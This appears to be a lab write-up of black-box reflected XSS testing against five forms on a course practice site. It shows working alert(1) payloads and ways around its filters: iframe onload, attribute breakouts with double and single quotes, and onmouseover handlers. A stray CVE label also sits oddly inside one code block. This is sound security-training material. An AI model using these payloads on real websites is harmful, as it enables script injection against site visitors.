# Exercise - Black-box discovery of XSS exploits

The goal here is to visit https://331.cybersec.fun/xss.php, which contains 10 input fields and a submit button. The challenge is to break all 10 of these inputs via manual testing. For each injection point, we must find an exploit to display a popup message on the webpage.

## Form 1
- I first tried sending the payload `<script>alert(1)</script>`, and noticed that the response was `alert(1)`. This means our input is being sanitized and reflected.
- I tried using a mix of upper and lowercase with`<sCrIpT>`, with the same result.
- Next, I tried `<img src=x>`, which was also removed.
- I then tried `<iframe>`, which did render an iframe! This is our way to perform XSS!
- The payload `<iframe onload=alert(1)>` works.

## Form 2
Tried sending `aaaa`, and noticed nothing was printed in response. However, when inspecting the response, I noticed this:
```HTML
Response 2 (CVE-2021-24884) 9.6 (CVSS 3.x):
  <a href="https://example.com" data-frmverify="aaaa">
```
So we can see that our input is placed in the `data-frmverify` attribute of the `<a>` tag. This means that if quotes aren't sanitized we can escape this and inject code. Some example payloads are:
- `" onmouseover=alert(1)> aaa`
- `"><img src=x onerror=alert(1)>` (This one triggers as soon as the page loads so I prefer it)

## Form 3
With the same approach as the previous form, we can see that an input of `aaa` returns:
```HTML
<a href="aaa"> Click me</a>
```
Meaning that a similar approach the the previous form could work (and it does). The payload `"><img src=x onerror=alert(1)>` works!

## Form 4
With this form, we can see that our input is being reflected. The payload `<img src=x onerror=alert(1)>` works!

## Form 5
The response here is similar to forms 2 and 3:
```html
<input type='checkbox' name='vuln_form' value='aaa'>
```
If we try escaping the value field with the payload `" onload=alert(1)`, we can see that our `"` is being sanitized as it's not letting us escape the attribute:
```HTML
	<input type='checkbox' name='vuln_form' value='" onload=alert(1)'>
```
However, if we instead try a `'` instead it does work:
```HTML
<input type='checkbox' name='vuln_form' value='' onload='alert(1)'>
```
However, the `onload` event doesn't trigger for this type. If we use the onmouseover event then our alert is displayed whenever the user mouses over the checkbox: `' onmouseover='alert(1)`.

If we try escaping the tags with `'><img src=x onerror='alert(1)`, we can see that the `<>` characters are also being sanitized:
```HTML
	<input type='checkbox' name='vuln_form' value=''&gt;&lt;img src=x onerror='alert(1)'>
```
Even if we send this as their url encoded counterparts `%3c` and `%3e`, we get the same response.
